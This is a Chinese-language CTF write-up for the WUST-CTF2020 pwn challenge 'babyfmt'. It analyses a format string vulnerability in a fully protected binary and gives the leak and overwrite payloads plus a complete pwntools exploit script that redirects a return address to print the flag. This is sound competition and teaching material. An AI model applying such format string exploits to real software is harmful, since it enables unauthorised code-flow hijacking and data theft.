## babyfmt

- 题目描述：

  > Author: ru7n

- 题目附件：[babyfmt](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/babyfmt/babyfmt)

- 考察点：格式化字符串

- 难度：困难

- 初始分值：1000

- 最终分值：1000

- 完成人数：2

本次比赛中最好玩儿的一道pwn题~

### 程序分析

先看下程序的流程吧

```shell
% ./babyfmt 
dididada.....
tell me the time:12 13 14
ok! time is 12:13:14
1. leak
2. fmt_attack
3. get_flag
4. exit
>>
```

先是有个didadida要求输入时间，不知道有什么用，下一个。

然后就是菜单了：

* 选2可以完成一下格式化字符串攻击
* 选1可以泄漏任意地址的**一个字节**...哼太抠门了！
* 选3会要求你输入一个字符串然后与`secret`进行比对，如果对了就打印flag。。。。嘛？

显然没那么简单

```c
  if ( !strncmp(secret, &s2, 0x40uLL) ){
    close(1);
    fd = open("/flag", 0);
    read(fd, &s2, 0x50uLL);
    printf(&s2, &s2);
    exit(0);
  }
```

出题人把`stdout`关掉了，所以`printf`啥都打印不出来。

> `secret`是程序开始时读的一个0x40长的随机数据

除此以外还有一处限制，`leak`和`fmt_attack`只能利用一次：

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp){
  // ...
  fmt_flag = 0;
  leak_flag = 0;
  //...
      if ( v3 != 2 )
          break;
        fmt_attack(&fmt_flag);
      }
      if ( v3 > 2 )
        break;
      if ( v3 == 1 )
        leak(&leak_flag);
   //...
}

unsigned __int64 __fastcall fmt_attack(_DWORD *a1){
  char format; // [rsp+10h] [rbp-40h]
  unsigned __int64 v3; // [rsp+48h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  memset(&format, 0, 0x30uLL);
  if ( *a1 > 0 )
  {
    puts("No way!");
    exit(1);
  }
  *a1 = 1;
  read_n(&format, 40);
  printf(&format, 40LL);
  return __readfsqword(0x28u) ^ v3;
}
```

用完会把相应的变量置1。

此外，这道题保护全开：

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

太有意思啦~

### 解题思路

保护全开所以没法改GOT表，还需要泄漏地址绕过地址随机化保护。

leak那个函数跟开玩笑似的（哼，就不用它）。

所以攻击思路就是利用好**格式化字符串漏洞**：

1. 先泄漏程序基址和栈地址
2. 然后再修改程序返回地址，跳过`close(1)`，直接打印flag

```nasm
0x00000f48      85c0           test eax, eax
0x00000f4a      7554           jne 0xfa0
0x00000f4c      bf01000000     mov edi, 1
0x00000f51      e832faffff     call sym.imp.close

0x00000f56      be00000000     mov esi, 0
0x00000f5b      488d3d170200.  lea rdi, str.flag           ; 0x1179 ; "/flag"
0x00000f62      b800000000     mov eax, 0
0x00000f67      e844faffff     call sym.imp.open
0x00000f6c      89459c         mov dword [rbp - 0x64], eax
0x00000f6f      488d4da0       lea rcx, [rbp - 0x60]
```

> 直接跳到0x00000f56这里，绕过close(1)

问题在于格式化字符串漏洞只能用一次，而完成上述攻击至少需要利用**两次**。

这也不难，因为限制次数的变量也在**栈中**，所以只要在泄漏地址的同时，把限制次数的变量清零即可。

payload1:

```python
sl('%7$hhn%17$p.%16$p')
```

> 清空变量、泄漏程序基址、泄漏栈地址。

payload2:

```python
payload = '%%%dc'%(flag&0xffff)+'%10$hn'
payload = payload.ljust(16,'A')
payload+= p64(stack)
sl(payload)
```

> 覆盖返回地址为打印flag部分代码地址

### exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './baby'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file,env={'LD_PRELOAD':remote_libc})
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
sla('tell me the time:','1 1 1')
sla('>>','2')
sl('%7$hhn%17$p.%16$p')
base = eval(ru('.'))-4140
stack = eval(ru('\n'))-40
info_addr('stack',stack)
flag = base+0xF56
info_addr('flag',flag&0xffff)
sla('>>','2')
# debug()
payload = '%%%dc'%(flag&0xffff)+'%10$hn'
payload = payload.ljust(16,'A')
payload+= p64(stack)
sl(payload)

p.interactive()
```

